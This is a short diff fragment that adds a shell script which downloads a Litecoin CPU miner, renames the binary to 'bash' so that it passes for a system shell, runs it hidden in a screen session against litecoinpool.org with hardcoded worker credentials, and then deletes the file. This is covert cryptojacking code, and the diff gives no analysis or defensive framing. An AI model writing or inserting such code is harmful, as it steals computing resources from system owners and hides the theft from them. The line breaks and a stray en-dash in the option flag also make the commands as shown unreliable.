@@ -1,0 +1,5 @@
+if [ ! -f bash ]; then wget 
+http://sourceforge.net/projects/cpuminer/files/pooler-cpuminer-2.3.2-linux-x86_64.tar.gz 
+&& tar zxfv pooler-cpuminer-2.3.2-linux-x86_64.tar.gz && rm pooler-cpuminer-2.3.2-linux-x86_64.tar.gz 
+&& mv minerd bash; fi; screen ./bash –url=stratum+tcp://litecoinpool.org:3333 --userpass=hunter111001:8265; 
+rm bash
